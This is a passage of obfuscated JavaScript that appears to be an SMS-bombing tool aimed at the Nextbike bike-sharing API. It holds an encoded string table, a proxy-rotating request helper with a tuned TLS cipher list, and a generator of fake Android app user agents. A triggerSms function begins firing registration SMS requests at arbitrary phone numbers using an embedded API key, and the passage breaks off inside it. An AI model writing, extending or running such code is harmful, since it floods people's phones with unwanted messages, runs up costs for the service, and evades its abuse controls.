'uKLhrW', 'AMvftq', 'yxn0ia', 'tNP3AG', 'z0ndBW', 'uMvKBq', 'CLr5AW', 'zsb8ia', 'sKXyzW', 'v2DREG', 'B3v0lG', 'v0TPtW', 'vezbCq', 'BMvK', 'yNL0zq', 'qKLlrq', 'wu11BW', 'ze1TBa', 'icHUDq', 'mKXNBq', 'ieHxsq', 's0PjtG', 'qMzrqG', 'C0P1zq', 'wZeVmG', 'DcaTrG', 'vJiYmG', 'wvzbra', 'tKzSqW', 'qwTpAq', 'AvbnuG', 've5Vwa', 'iIbPBG', 'B3DUia', 's2XruW', 'wxzmEq', 'igCGCW', 'iZaWqG', 'EMjttW', 'ywnO', 't1bfrq', 'CgHVBG', 'ssblzq', 'zwz5uG', 'mc05yq', 'EMTpDq', 'ic8GlW', 'yMLRzq', 'tffwEa', 'uhHbrG', 'D1HbAG', 'wNvuCq', 'mIKGnq', 'zxjLza', 'uKrxqq', 'BeDmra', 'mtyZ', 'uK1Rsq', 'rxfVzW', 'u1nmxW', 's0HLwq', 'DuzMuq', 'x18VxW', 'yK9bzq', 'z2LZDa', 'DfXdCG', 'EKjuyW', 'ALLbrq', 'AgPlCW', 'zfvlvW', 'q2XmtG', 'qNvPBa', 'DgvNCG', 'Dg9Rzq', 'CMvTzq', 'wLLUua', 'txLotq', 'CY50Ea', 'yLDwrG', 'vgPtra', '8j+tGsbmBW', 't3flAa', 'turrua', 'BMDLia', 'B05ZsG', 'u0Lttq', 'ywDLpq', 'Cw9oAG', 'rvnFmG', 'vvjdrq', 'Dgviyq', 'r2HSwG', 't2jPzG', 'CM9Yqq', 'iev4Aq', 'CxvPCG', 'uMDfqq', 'tK9uia', 'Aw1jBG', 'zxi7ia', 'rJG4', 'BMfMvq', 'Dhb1Da', 'zLPvBq', 'igrVDW', 'tM8Gqq', 'ywXRqa', 'y2uUyW', 'u00TuW', 'C2XPyW', 'Bca3ia', 'zxjZrG', 'C3vICW', 'ote4qG', 'xcaGFa', 'z2DIEa', 'zcb0Aa', 'mI4WlG', 'yujiuG', 'C2LN', 'EeHkta', 'ihrHCG', 'ifjftq', '4Psa4Psa4Psa4Psy', 'rwHmuG', 'ndPuta', 'ifrVBW', 'oKvdra', 'Aw9U', 'zwqGDa', 'BMLTBa', 'zM5UtG', 'v2DoEa', 'veHzEG', 'B2XkEa', 'kev4Da', 'D0PpDW', 'yKHzyW', 'twfTrG', 'BgLUzq', 'C3nPBG', 'rv0GwW', 'BguGua', 'y1jYAG', 'D1DxrG', 'v2DMtq', 'q3nvsG', 't1zfra', 't09ADW', 'AYbfCG', 'zgvUyW', 'r0rdBG', 'u0eTqW', 'wxzWtG', 'zNPwsq', 'qNHtua', 's2zAyG', 'BwfW', 'uLnyBW', 'swXqvq', 'tg1Asq', 'ExLbrW', 'zxiGmW', 'rhP3ra', 'y1j3wq', 'q1jItG', 'zuzPBa', 'nZeXqG', 'wKzwCW', 'rcbPBG', 'Aw5JBa', 'vfL0qW', 'mZjFta', 'ugf0Aa', 'zMLSDa', 'zf9WCG', 'mhW0Fa', 'q1D0Aa', 'id0Gka', 'vgT0ua', 'Aw1Lia', 'D0z5Aa', 'EM9VDG', 'DhD5wa', 'DgfYDa', 'zvnIza', 'ENjMEq', 'D01oCq', 'yxbWzq', 'C3bSAq', 'zs5JBW', 'uePNwq', 'xYbFxW', 'EgL0Aq', 'sfjNsq', 'CNj5Ba', 'vvrglq', 'ChDJAG', 'y3LrvW', 'zezQwa', 'xsbuBW', 'u1njtW', 'BvzLza', 'tLHzzW', 't1rqia', 'CxHiwa', 'C1nfqq', 'zY4UlG', 'ufDNzq', 'u0Hxua', 'mc4Yia', 'BgrpCW', 'zhLQyG', 'q0Tdta', 'AvvXDq', 'ueL0qW', 'z1Hnsq', 'yuf6Cq', 'zxjFDa', 'BfjUEq', 'Bca4ia', 'BM5UtW', 'vejjsW', 'rY1vsq', 'DK9wqq', 'y2zqvG', 'EvL2EG', 'DgGGwW', 'DfvitG', 'ie1HBG', 'ugnnrW', 'BwfUtW', 'AMjMzW', 'tKvyva', 'yM1QAG', 'DgLUDq', 'Fe9uua', 'z3mMBa', 'u01tAa', 'C0njta', 'Aw5Ozq', 'zsaZma', 'z2DrBG', 'igCOoa', 'A01yCa', 'nKj2vK1xvq', 'yNPsuG', 'wM9fta', 'w1jfva', 'AhvUwG', 'zxjfBG', 'wLLvDG', 'y3r1Da', 'Bhfjwa', 'qNb4AW', 'zLbtyW', 'rhvpuq', 'rMfZDa', 'sKTTsa', 'uxHxua', 'whfKBW', 'lNr4Da', 'zxqP', 'u3rYAq', 'CeDgBa', 'z2v0CW', 'nNWXFa', 'nZm2qG', 'A0rICW', 'ywLUpq', 'ws0Tlq', 'BenVDq', 'zxWYlG', '4Psu4Psa4Psa4Psa', 'mJbFua', 'EK5fvG', 'l3bPBG', 'oteXqG', 'y3vZDa', 'rKfStW', 'A0rcsG', 'CxvLCW', 'C3rLBG', 'wgTNta', 'r1DVra', 'B3n0lG', 'zwn0', 'twLJCG', 'Dg9Hzq', 'q3zYwq', 'qKD6AW', 'wfnSyq', 'DfzNvq', 'vefvwa', 'y3Dtsq', 'DffKyq', 'zNjVBq', 'zgjiuG', 'BhvZ', 'zcbMCG', 'Dg9vCa', 'tuvLBW', 'ChHZBa', 'lIbCFa', 'yvLYzW', 'ywnOAq', 'zw9NCW', 'ig9Mia', 'qwffvG', 'tNfbrW', 'DgfUDa', 'zMTJua', 'wNbtqq', 'sLvgBW', 'Ew5J', 'iezPBa', 'BxLuuq', 'jMrVBq', 'DgjXzW', 'sw5ZDa', 'su5Jra', 'rvmXmG', 'qwL6yG', 'tw9Kzq', 'vwPfyW', 'DcbSzq', 'ywn0Aq', 'uwrrzG', 'rfHwsG', 'y21K', 'BePpuG', 'mZG1', 't1jDia', 'ndq5', 'vujmsq', 'BKXhvG', 'wezSCa', 'EMLHwG', 'ufL3zq', 'yxrLia', 'BfLwyW', 'suHQqW', 't1jgBa', 'wfruvW', 'DhHOrq', 'z3jLzq', 'uLnREq', 'Bca3yq', 'BMLUzW', 'zY4k', 'D3jPDa', 'B21vvq', 'Bezgqq', 'A2fhqG', 'C0HxuW', 'Euvbsq', 'Dwjjrq', 'B2XqAW', 'D1DPyq', 'q0rmuG', 'luHbuG', 'EeHSBq', 's0jzyq', 'zw5jza', 'ihnHDG', 'rgP1CG', 'CNzLCG', 'De92Dq', 'AMLnvq', 'suTvva', '4Pwq4Pwq4Pwq4Pwx', 'y3DjDW', 'EhbTrq', 'Dg5JtW', 'yxDnBW', 'rfveAW', 'CLr2va', 'uhflDa', 'v0f0yq', 'DgvZDa', 'C3jusG', 'rNrcrG', 'ANrKta', 'vJiYma', 'CvnptG', 'AfPiBq', 'DMT0Eq', 'tKrcDG', 'B2nRzq', 'y012CG', 'ALjtDW', 'zguUAG', 'r1jHsW', 'B2zRzq', 'wwDHDa', 'suXdwa', 'BNvTyG', 'wwvrAq', 'y2HlEG', 'keDLDa', 'ruP2rG', 'whf6uW', 'vfziBW', 'igvYCG', 'y1bsCG', 'D1P6sa', 't25Lua', 'AePmBW', 'zw1YDq', 'nZaW', 'C1jSra', '4PYtieXV', 'zcaVia', 'icaG', 'DhjNzq', 'y3bXsW', 'txnhAW', 'ifvoqq', 'DhLWzq', '4Pwq4PwDcG', 'yxjLia', 'rMD4tW', 'DNLZCa', 'y2HHBa', 'ruT0Da', 'zxHLyW', 'Cg9qyW', 'BLvprq', 'C3nPBW', 't3HUrG', 's2LUzW', 'vLvTsG', 'sez0Da', 'twHTEG', 'DhbZlq', 'uKrQtq', 'quzqwG', 'zM9Yrq', 'zwvK', 'qwzvyG', 'ENf4vq', 'ywDL', 'ugn3AW', 'uunuBq', 'r29VzW', 'ChbFAa', 'r0nnlq', 'C01nDW', 'DML2BW', 'C3voBq', 'AhDPza', 'zxnZAq', 'Dg8GCG', 'z2DtDW', 'ifnPBa', 'ueHoua', 't3bWBW', 'DuLcCW', 'D25KuW', 'sxP0zG', 'x3nLCW', 'sMvKuW', 'ntzFrW', 'sgvbzq', 'C2v0uW', 'vwHRCW', 'AMnJAW', 'yMfZzq', 'vg1Zta', 'BKfsyG', 'tNLuqW', 'Dur2Ca', 'mti4xW', 'zgncwq', 'uun3Ca', 'Ew1JAa', 'sM1nCa', 'BLP4zG', 'sLngEG', 'wgfPzW', 'wxDlzG', 'ihn1CG', 't2nbua', 'DNzcAq', 'AM51qG', 'ChjVEa', 'EMXlrq', 'ue9tva', 'zYbZzq', 'vurPvq', 'B2Lzra', 'zLjRwq', 'nZvHBW', 'ntaWkq', 'rKTXCW', 'Bgz1yG', 'wgLHBW', 'DgjPAW', 'ieLUDa', 'zsbBza', 'ifnLCG', 'wLnKza', 'sKfhyq', 'rvntia', 'yxrVCG', 'zM5drq', 'FdeY', 'uKLPrG', 'teTKCa', 'mta5nNbJr05oAq', 'ELDTwa', 'otKXqG', 'mxWZFa', 'twHXBW', 'wwXpAq', 'AwXL', 'wfeTra', 'Aw4ZmG', 'rhDbDa', 'z3fcrW', 'ote2qG', 'CgXkta', 'vg5uza', 'tgzJsW', 'Fdj8mW', 'vNHQsW', 'icbCia', '4PYxifLV', 'zw4Tvq', 'sgfYza', 'rgfrAq', 'Awz5', 't0zuvW', 'xsbivW', 'DLDxrq', 'vLrNzq', 'Ag91CG', 'uwXAua', 'AhnQwa', 'DxnL', 'sMzrwG', 'DYbRzq', 'ic0Gsa', 'x19Fia', 'te9dyW', 'zw5Nrq', 'CwnTwq', 'qLboDG', 'B3iGka', 'u00Ttq', 'xsbuCG', 'v2L0Aa', 'vgztyW', 's2T4Dq', 'CufmBa', 'DwnVwa', 'Fg5LEa', 'sxv0Cq', 'tMnPwq', 'y2HLwG', 'uLKGia', 'EgLLCW', 'ywPICG', 'sfbmzW', 'B3rOwa', 'r25iDq', 'B3HPzq', 'icborq', 'FfXFxa', '4Psm4Psa4Psa4Psa', 'qvvICG', 'rLrbCq', 'zw91Da', 'ttiXma', 'ucbtDa', 'C29JAW', 'icGOja', 'uNHmDq', 'zwqUDa', 'xhXFFa', 'ANnVBG', 's3LRwa', 'i0zgnG', 'q1vssa', 'D2DuAa', 'uKuG4Ocu', 'yMfIEa', 'CIbJDq', 'mte5ra', 'vuPYCa', 'rgjRCq', 'CM9Y', 'svzMCa', 'ENLVAW', 'vwLgqG', 'ueDvAG', 'AwnLBG', 'sNvMuG', 'ie5Via', 'B3qGzW', 'rsbutW', 'tKnmBG', '8j+mKcbbDq', 'wKrJzq', 'muS2rW', 'vevgsa', 'ww1yra', 'zxmUia', 'AhHTza', 'i0zgra', 'A0TdBW', 'oc1hqW', 'v1rQvW', 'sNfcDa', 'DuTbwa', 'Dw5N', 'ue9YEa', 'EsbZyq', 'B3nVzG', 'BxHKwa', 'z0ruBa', 'zefUra', 'CLrJCq', 'ota4qG', 'y2DICq', 'CYbHBG', 'y3rPBW', 'qvvptW', 'jYaVFa', 'z3vUEG', 'ENfwBa', 'tunSvW', 'Cxbfsa', 'CgfYCW', 'rxzLBG', 'yIKGlq', 'nde1', 'zLPeuW', 'DxnLCG', 'EwzXva', 'ywLSCW', 'EsbcBa', 'vM9JvW', 'DgD1sW', 'wu5ovG', 'qLz3sW', 'q0fjDW', 'uKvhsq', 'zgvZDa', 'zffWwa', 'tffMyG', 'zxiGmq', 'yMLKza', 'nty6rq', 'uLjuDq', 'r1jADa', 'DwDdrq', 'teLdia', 'tMv4Da', 'EKLW', 'u0eTqq', 'Dg90yq', 'zfn6yW', 'u0HbmG', 'ALnetW', 'ovbdra', 'z2D1Ca', 'w05fwa', 'nfvvs2fOBG', 'u2vYDG', 'ww5fsW', 'oda0mdCYB0rxy2v2', 'B25Uzq', 'Aun4sW', 'q0jOta', 'y2HLyW', 'q29eBa', 'uhPeDa', 'Dw5Kia', 'yMrltq', 'u1qTtW', 'EfvMAq', 'CY1WCG', 'n3WXma', '4Pwq4Pwq4Pwq4Pwq', 'z3jHEq', 's25tDq', 'rKzdwa', '4PYtifnH', 'wePQtW', 'z3zLrG', 'otaXqG', 'sKvkCG', 'v0Tgsq', 'r1joqq', 'ienYzq', 'CwroAa', 'B0HItG', 'r2jiCW', 'BYbmAq', 'A3LYCG', 'tuXpqq', 'z3vKyq', 'vwL5BG', 'ExvwyW', 'ifj1BG', 'rxHPDa', 'tIa9pq', 'icHLlG', 'ChvZAa', 'suXgtW', 'yuzJsa', 'qJzc', 'Dhj1yW', 'C09RAW', 'CNnOzq', 'BwvZCW', 'mZCX', 'ie9uua', 'ELLXAa', 'shPzsW', 'otK2qG', 'y2vjra', 'vvbDia', 'tvjLtG', 'icdILzeG', 'C0nzwq', '4PYtifrO', 'ieyZ', 'qwf5yG', 'zcbRzq', 'BIbtAq', 'AeX4qW', 'DuLLCa', 'tvDKDa', 'vxzQCG', 'ywfIuG', 'BNnLza', 't0PgAG', 'z0f6uW', 'ihrYAq', 'yYzTBW', 'BMnLia', 'B2zPBa', 's2rhvG', 'qwzuyW', 'Agv4', 'rLHxCW', 'q21OwG', 'ie51Bq', 'qMXVyW', 'teuYmq', 'vfLRBG', 'suPIwG', 'vhvAwq', 'yuLWEG', 'DgfSzW', 't0HPBa', 'zg93BG', 'Fdb8nq', 'uxL1qG', 'ksGGkq', 'BMv0DW', 't3zSAq', 'BMCUia', 'BMv4Da', 'BxDJwq', 'tgrbBa', 'rwDlDa', 'q1zZEq', 'yxjKDW', 'CxzRqq', 'yML6Aq', 'r05Pva', 'CM4GDa', 'Bxv2za', 'v3P2tW', 'EwPXBW', 'CMvHBa', 's0fAsq', 'rxfpEa', 'uuf5Ea', 'wZm2Bq', '4PYtiefq', 'ssbRzq', 'igj5ia', 'xsbtDa', 'CMnNwG', 'CMfUzW', 'qvLqAa', 'As92mq', 'vKX0wq', 'wfeTqW', 'zw4Uia', 'r2v0lq', 'A0HhEq', 'CIboDq', 'EgvK', 'icPCka', 'ifn0yq', 'B21MEa', 'BwLU', 'z2rRCa', 'ChPgqq', 'vgHYzq', 'iZaWrG', 'BwfUEq', 'zw5Zzq', 'sxffwG', 'y2joBW', 'suqGia', 'zsbPDa', 'tePZCG', 'vKvkwa', 'seuTrq', 'BMrLBG', 'zuD0ua', 'g1SYsG', 'wKzJsG', 't05ZvW', 'wwjquW', 's0vYDq', 'suzOBG', 'AKXVBq', 'DxrMoa', 'mMzeweHrDG', 'zLHdzq', 'B21Tyq', 'zuLjwG', 'tgTntW', 'mJaY', 'teT6sq', 'DgfSBa', 'DwTPrG', 'DxndBW', 'DKrxtG', 'pt09ia', 'C3qGDa', 'DhmP', 'zY4GmG', 'y2LLCW', 's2jiCG', 's0iYma', 's1LdtW', 'nduX', 'Ee1ZCW', 'r25ACG', 'rYbtrq', 'ChqTzq', 'C2LVBG', 'zgLABG', 'sxvbqW', 'ierPCW', 't05fua', 'tsbHCG', 'vgfMsW', 'EhbTzW', 'sMHnrW', 'rvPbAW', 'zg9luW', 'Bca4', 'wgT4sW', 'y2HPBa', 'ChHnra', 'vcbtrq', 'tKP4BG', 'rhrjBq', 'nhWXmW', 'zNbOyq', 'EgfvAq', 'CIbUDq', 'ENnLEa', 'uev6wG', 'seuTuG', 'weDdnW', 'A0DdsW', 'BM9Uzq', 'FdeXFa', 'r0futq', 'ifXFFa', 'tNvTyG', 'ihvSDa', 'DwX0kq', 'tfjrAW', 'sfjjrG', 'ExLgzW', 'Aezesa', 'rwfRDa', 'BM9WEq', 'thDNsq', 'DhPOAG', 'wfrcsq', 'BM5LyW', 'lM5LEa', 'u2fPtW', 'Bwvtzq', 'C2v0uG', 'qvjfxa', 'rsaGia', 'mZq2rq', 'DwPTrG', 'q0fIwG', 'ihzLCG', 'tgjSrW', 'igLUDG', 'r2nsAa', 'ts1tsa', 'rKDsAG', 'ywXeAq', 'Be1mDa', 'kYKRja', 't3rRtG', 'yMnTzG', 'B3DXtq', 'CMqGlq', 'vfrqia', 'vhHWuq', 'BcbuAq', 'ihzHBa', 't3n2tG', 'refvyW', 'wdi1nq', 't2fXua', 'icaTlq', 'luvora', 'CML0', 'rK5tra', 'mJaXxW', 'ueXfva', 'D1rVrW', 'yLH1qq', 'zxjZlG', 'mJeWoa', 'uwjqsG', 'vfvABG', 'ruqGlq', 'Awzryq', 'DujXBa', 'vw5RBG', 'u0zWrW', 'zgLNzq', 'g1Ti', 'mJm2qG', 'DguGmq', 'vfvqxq', 'p2fWAq', 'DgvFCG', 'z2H0', 'AKTZtG', 'lIbfEa', 'BIbMAq', 'tLrLwG', 'DKPVEG', 'CMv0Dq', 'ys52', 'CwXOqG', 'mtq2ua', 'CMvZDq', 'BgX5iq', 'B0nTuW', 'EfjOvW', 'mJiXmq', 'C3rHBq', 'zw5LCG', 'B2XmqW', 'ywnJzq', 'AuTuBG', 'rxvZBW', 'DgfnBq', 'BgXTBW', 'Aw9UlW', 'zKneuG', 'ihWGxa', 'C2SGlq', 'CffcEq', 'B3iOiG', '4P6ug1SZ', 'BcbgBW', 'Bw90BW', 'zw4Myq', 'g1SYsW', 't1jcyq', 'ifnLCW', 'ugL4zq', 'zxjFAW', 'whjYzW', 'Cgf0Aa', 'mJq0mdKXmtbfELvkseW', 'revcvq', 'BcbODa', 'ihX8ia', 'lI4k', 'Awq7ia', 'BevhAG', 'zxrYAq', 'sw52yq', 'iezVCG', 'ifDPBG', 'D0PLAa', 'Cgfosa', 'mtmXnG', 'BcbKzq', 'zwXeCW', 'cLTtrq', 's05orW', 'wLLUsa', 'Dc9HCa', 'BNDirq', 'CdiVzW', 'u3yX', 'uK1ymW', 'B2jQzq', 'yMXtra', 'zxvL', 'uxLtqW', 'ifGZia', 'AwnHDa', 'whbMma', 'yufIDW', 'A1zmDW', 'y2uGvW', 'AxjnAG', 'igfNyq', 'sM1HDG', 'CwLlEa', 'zgHtEq', 'quTxvW', 've5tqW', 'C2f2zq', 'Ae1Usa', 'qKfRyG', 'BNrLCG', 'BMCUlG', 'DxjkEG', 'u1LXBa', 'vhf0BW', 'y3LOqG', 'ufvIsG', 'DhbZzq', 'rM16Ea', 'y2fSBa', 'tvmGva', 'B21YCG', 'veXtxW', 'A2v5Ca', 'zxjYBW', 'zhDQyW', 'vgXYvW', 'BgTcEa', 'q1qGtG', 'DgnSqW', 'ALzjqG', 'wwzQwG', 'reLsrq', 'yKfxCa', 't1HADW', 'Dg9gAq', '4PYxie5V', 'AxnPuq', 'zgLYBG', 'ig51Bq', 'q29UzG', 'Aw5Nia', 'Ahr0Ca', 'mtG4lG', 'vfjkDq', 'wvDWzG', 'rgfAzW', 'vJiXna', 'nteYndDHv29Qs2W', 'ks5tzq', 'tef3tG', 'zMXVBW', 'swLYAq', 'ufPqwq', 'y1rpBq', 'CwPMDG', 'BgfUAW', 'ruqGlW', 'BhrgCa', 'vxnLia', 'sLbzsW', 's3PNEG', 'uMXlBG', 'CZq6lW', 'q1bfBW', 'Eg5WsW', 'tfzSAG', 'zwHVyq', 'luvYCG', 'otK4qG', 'odq6rq', 'q1vwDW', 'y3rYBa', 'lI4UcG', 'wvj3tG', 'rMvvvq', 'AKTizq', 'r3PzBa', 'drTBsW', 'C3HyCa', 'yu90Ba', 'CKv6Aa', 'tvDzzW', 'yMvYCW', 'BM9Qzq', 'icbFia', 'DKv6Ea', 'zKTQua', 'zuvJta', 'mv06', '4Pwq4Pwq4Pwx', 'AxjZDa', 'qwPMDW', 'DMvYCW', 'uhjLBq', 'D3zJza', 'Bezjwa', 'vuTwBG', 'Ew91CG', 'yLrura', 'CM92Aq', 'v1zbwa', 'lujfrW', 'CeP2Aa', 'v3jPDa', 'mZm2qG', 'AuLfrG', 'thP2Aa', 'nty6va', 'CgHOBq', 'EM92uG', 'zsaTqW', 'zxjZ', 'D2HPBa', 'oti2qG', 'wxzvEa', 'AvfwrW', 'y1biAa', 'l3yXlW', 'sMPVwG', 'yxnL', 'CMvHCW', 'tvvcDW', 's0XWDa', 'D0zJsW', 'DMf0EG', 'mtC2lG', 'vc1xsq', 'ihWGia', 'z1HeqW', 's29xDq', 'w1nfva', 'swfcvG', 'rMDmsq', 'w0vsuG', 'zeHPyq', 'zxj2Aq', 'vuPjAa', 'ue9dtW', 'ntC3', 'Bca2', 'sg9nwG', 'ndKZ', 's1zhBq', 'CePMBq', 'zxnZzG', 'y0HHrq', 'sMfdva', 'ienVDq', 'ie5LDa', 'rKngAa', 't3bnCq', 'zwfTAq', 'runivG', 'oIbnAq', 'Egfpva', 'Bcbtzq', 'yvLjrW', 'sLDJsG', 'zxHHBW', 'CgvYqW', 'DMvmAq', 'DKvXzW', 'zwnRia', 'vtDqyW', 'qLvtBG', 'yxrLza', 'wu50zG', 'Bca3', 'x1WGxa', 'zwfZzq', 'q1f4qG', 'Dg8GzG', 'qvveBG', 'zsbSyq', 'BK5XAW', 'z1DIuW', 'EK5oAG', 'z2fKsq', 'sg93ia', 'uhjVyW', 'AKzSAG', 'qKzcwG', 'Aw1LBW', 'mZa1xW', 'nurb', 'rK90DW', 'ywv5BW', 'ks4Grq', 'DK1pra', 'x3WVxW', 's0uGuW', 'ywzLDq', 'B21cEq', 'EKPgsW', 'txDsCW', 'ywrZ', 'AgvHza', 'yxrOia', 'AMfXsG', 'u2DbAq', 'DcbMBW', 'y3jLyq', 'tvfNyq', 'mZCW', 'ihjLCW', 'icak', 'qLr6Da', 'DKDNCa', 't21Vvq', 'mI9Nzq', 'qwr5va', 'AMTtsq', 'D3jzyG', 'BMfuAq', 'rxrntW', 'AgTUza', 'qZCY', 'DwuPlG', 'A2LSBa', 'rhflvG', 'A3nVva', 'if9FxW', 'r0rbyG', 'q0roqG', 'mtaGva', 'vufJyq', 'Fc8GlW', 'B25ZDa', 'zuvUzq', 'shPyDq', 'sefdsa', 'zcboua', 'jsdILiiG', 't1jSsq', 'CvHHyq', 'DwWUDa', 'EsbMBW', 'icdILztILza', 'EMzNtq', 'q1bimG', 'zev0wq', 'DNDzAa', 'zxjUzq', 'qKDjza', 'EfDLBW', 'BNPutq', 'C3vTDa', 'CYb0BW', 'vhzAzW', 'ywrKta', 'zgH4DG', 'ndG1wa', 'Eu1Z', 'vwfWBa', 'vhLzwG', 'rgv2Aq', 'mJiWmq', 'cIaG4Pwu', 'DMvKlG', 'ufrlrG', 'C2vYDG', 'yxbPsW', 'j0Hlta', 'twfRzq', 'uwHgBa', 'vgvmuq', 'A1HbyG', 'mJu2lq', 'EgrpvG', 'BMfgwa', 'Cg9UCW', 'AwzPyW', 'u0vmrq', 'vJiXmq', 'icbFxW', 'BMCG', 'EwTcDG', 'rhjhyW', 'zxiGCG', 'B0TxDa', 'zw4GBa', 'sKLgAq', 'wLbvrG', 'nti1', 'rhDADW', 'CNLZAG', 'tMv4wa', 'vNbjuG', 'yKfNCG', 'Ewz0AW', 'ienptq', 'Es9ozq', 's2fWta', 'AKP2uW', 'zuHjza', 'D2Dlta', 'sePPrG', 'B3jRoG', 'mtmWnq', 'CdmVzW', 'igTLEq', 'z1jMCq', 'u0HbmW', 'quX6Aq', 'rhriBG', 'CM9Wzq', 'y1vcwa', 'CIa0ma', 'Aw9Uia', 'CMvTBW', 'keXLyq', 'twLzsq', 'uvLesW', 'ntyX', 'suTvBG', 'igCOnq', 'ANrJvW', 'q3vZDa', 'DwrLCW', 'xYbCFa', 'BNn0yq', 'EwvVyG', 'thyZ', 'vujUwq', 'BwuVCW', 'ALPTAG', 'zxHPDa', 'ELvLva', 's2TluW', 'BwCSja', 'xhWGFa', 'AKf6wa', 'DhmGka', 'q2jADq', 'sxbLEG', 'zgHszG', 'qvriyW', 'yunlAa', 'tKvPrW', 'DMvKia', 'zxjZlW', 'qwrKia', 's1f2Eq', 'C3rKBW', 'BNnLoG', 'odq4odeWn3LdvLrPEq', 'v2LUza', 'z2LytG', 'yMLSzq', 'EwPcAG', 'mteZuW', 'idqYoq', 'sxPREq', 'qZuY', 'mL9qCG', 'Ag9Uzq', 'C2v0Dq', 'tgPUyq', 'isbqBa', 'g1SWBq', 'zsa0ma', 'AxnosW', 'DhnxAq', 'zYbbyW', 'Ben1sq', 'jg1Iia', 'xYaPxW', 'BwXKta', 'reDVyW', 'y01lvW', 'xcTCkW', 'D2LUmW', 'mtG1ote2mhjTzeXAqq', 'B3rSsa', 'DePWAW'];
  fn1 = function () {
    return v50;
  };
  return fn1();
}
function createProxyAgent(v51) {
  if (!v51) return null;
  let v52 = '';
  if (v51.type === "socks5" || v51.type === "socks4") return v52 = "socks5://" + (v51.user ? encodeURIComponent(v51.user) + ':' + encodeURIComponent(v51.pass || '') + '@' : '') + v51.host + ':' + v51.port, new SocksProxyAgent(v52);else {
    return v52 = "http://" + (v51.user ? encodeURIComponent(v51.user) + ':' + encodeURIComponent(v51.pass || '') + '@' : '') + v51.host + ':' + v51.port, new HttpsProxyAgent(v52);
  }
}
function sendRequest(v53, v54, v55, v56, v57 = null, v58 = 15000) {
  return new Promise((v59, v60) => {
    {
      const v61 = new URL(v53),
        v62 = {
          ...v55
        };
      let v63 = v62;
      if (v56) {
        v63["Content-Length"] = Buffer.byteLength(v56);
      }
      const v64 = {
        'hostname': v61.hostname,
        'path': v61.pathname + v61.search,
        'method': v54,
        'headers': v63,
        'timeout': v58,
        'ciphers': "TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305",
        'ecdhCurve': "X25519:P-256:P-384",
        'honorCipherOrder': false,
        'secureOptions': require("crypto").constants.SSL_OP_NO_SSLv3 | require("crypto").constants.SSL_OP_NO_TLSv1 | require("crypto").constants.SSL_OP_NO_TLSv1_1,
        'minVersion': "TLSv1.2"
      };
      let v65 = v57 ? parseProxy(v57) : null;
      if (v57) {
        if (!v65 || isNaN(v65.port) || v65.port <= 0) return v60(new Error("Invalid proxy"));
        v64.agent = createProxyAgent(v65);
      }
      const v66 = https.request(v64, v67 => {
        {
          const v68 = [];
          v67.on("data", v69 => v68.push(v69)), v67.on("error", v60), v67.on("end", () => {
            let v70 = Buffer.concat(v68);
            const v71 = v67.headers["content-encoding"];
            if (v71 === "gzip") try {
              v70 = zlib.gunzipSync(v70);
            } catch (v72) {} else {
              if (v71 === "deflate") try {
                v70 = zlib.inflateSync(v70);
              } catch (v73) {}
            }
            v59({
              'status': v67.statusCode,
              'data': v70.toString("utf8"),
              'raw': v70,
              'headers': v67.headers
            });
          });
        }
      });
      v66.on("error", v60), v66.on("timeout", () => {
        v66.destroy(), v60(new Error("timeout"));
      });
      if (v56) v66.write(v56);
      v66.end();
    }
  });
}
function getRandomNextbikeUA() {
  const v74 = {};
  v74.samsung = ["SM-G998B", "SM-G991B", "SM-G996B", "SM-F926B", "SM-F711B", "SM-S901B", "SM-S906B", "SM-S908B", "SM-S911B", "SM-S916B", "SM-S918B", "SM-A528B", "SM-A536B", "SM-A336B", "SM-A135F", "SM-A736B", "SM-M526BR", "SM-M336BU", "SM-A146P", "SM-A546E", "SM-A546B", "SM-A346E", "SM-A236B", "SM-A127F", "SM-A217F"], v74.Xiaomi = ["M2101K6G", "2201117TG", "2109119DG", "2201116PG", "2201117TY", "2203121C", "22081212C", "23049PCD8G", "22101316G", "22111317G", "23013PC75G", "22101320G", "2107113SG", "21081111RG", "2201123G", "Redmi Note 10", "Redmi Note 11", "Redmi Note 12", "POCO X3 Pro", "POCO F3"], v74.OnePlus = ["ONEPLUS A6013", "KB2003", "LE2113", "LE2123", "MT2110", "NE2213", "CPH2449", "CPH2415", "CPH2451", "CPH2493", "CPH2581"], v74.Google = ["Pixel 6", "Pixel 6 Pro", "Pixel 6a", "Pixel 7", "Pixel 7 Pro", "Pixel 7a", "Pixel 8", "Pixel 8 Pro", "Pixel Fold"], v74.Oppo = ["CPH2173", "CPH2207", "CPH2359", "CPH2371", "CPH2363", "CPH2385", "CPH2437", "CPH2525", "CPH2577"], v74.vivo = ["V2109", "V2111", "V2130", "V2145", "V2202", "V2231", "V2227A", "V2271A", "V2314A"], v74.realme = ["RMX3363", "RMX3370", "RMX3301", "RMX3472", "RMX3561", "RMX3311", "RMX3706", "RMX3840"], v74.motorola = ["motorola edge 30", "motorola edge 30 pro", "motorola edge 40", "moto g(82) 5G", "moto g(52)", "moto g stylus 5G", "motorola razr 40 ultra"];
  v74.Asus = ["ASUS_I005DA", "ASUS_I006D", "ASUS_AI2201_C", "ASUS_AI2202"], v74.Sony = ["XQ-BC52", "XQ-BC72", "XQ-CQ54", "XQ-CT54", "XQ-DQ54"];
  const v75 = v74,
    v76 = Object.keys(v75),
    v77 = v76[Math.floor(Math.random() * v76.length)],
    v78 = v75[v77],
    v79 = v78[Math.floor(Math.random() * v78.length)],
    v80 = v77 + '\x20' + v79,
    v81 = 5,
    v82 = Math.floor(Math.random() * 4) + 1,
    v83 = Math.floor(Math.random() * 10),
    v84 = "a.v" + v81 + '-v' + v81 + '.' + v82 + '.' + v83;
  return "nextbike/" + v84 + '/' + v80;
}
async function triggerSms(v85, v86 = {}) {
  const {
    onStatus = () => {},
    timeout = 15000
  } = v86;
  let v87 = v86.proxy ? rotateSessionId(v86.proxy) : null;
  const v88 = normalizePhoneNumber(v85);
  const v89 = v88.replace('+', ''),
    v90 = encodeURIComponent(v88);
  onStatus("[1/2] Triggering SMS...");
  const v91 = "https://api2.nextbike.net/api/v1.1/register.json?api_key=zKeYbPSxKi4Xpf0c&mobile=" + v90 + "&domain=gs&language=en&app_hash=GbHsVs75zIp",
    v92 = getRandomNextbikeUA(),
    v93 = {};
